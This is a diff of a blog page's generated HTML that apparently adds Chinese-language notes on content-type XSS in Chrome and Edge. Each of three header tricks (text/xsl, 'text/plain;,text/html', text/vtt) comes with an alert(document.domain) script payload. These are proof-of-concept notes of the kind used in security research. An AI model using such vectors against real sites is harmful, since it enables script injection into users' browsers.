@@ -392,14 +392,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    342
+                    439
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -469,7 +469,17 @@ alert("Hello from a javascript!!!");
 --sample_boundary
 
 </code></pre><p>师傅们tttttttttttqqqqqqqqlllllllllllll</p>
-<script>
+<h2 id="chrome-中的content-type-xss"><a href="#chrome-中的content-type-xss" class="headerlink" title="chrome 中的content-type xss"></a>chrome 中的content-type xss</h2><h3 id="设置-text-xsl"><a href="#设置-text-xsl" class="headerlink" title="设置 text/xsl"></a>设置 <code>text/xsl</code></h3><p>被处理为 xml</p>
+<pre><code>Content-Type: text/xsl
+&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;
+</code></pre><h3 id="设置为text-plain-text-html"><a href="#设置为text-plain-text-html" class="headerlink" title="设置为text/plain;,text/html"></a>设置为<code>text/plain;,text/html</code></h3><p>支持多种引号分割</p>
+<pre><code>Content-Type: text/plain;,text/html
+
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><h2 id="关于-Edge-的content-type-xss"><a href="#关于-Edge-的content-type-xss" class="headerlink" title="关于 Edge 的content-type xss"></a>关于 Edge 的content-type xss</h2><h3 id="设置为text-vtt"><a href="#设置为text-vtt" class="headerlink" title="设置为text/vtt"></a>设置为<code>text/vtt</code></h3><p>被处理为 html</p>
+<pre><code>Content-Type: text/vtt
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -840,7 +850,7 @@ alert("Hello from a javascript!!!");
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.4k</span>&nbsp;字
+                class="white-color">8.5k</span>&nbsp;字
             
             
             
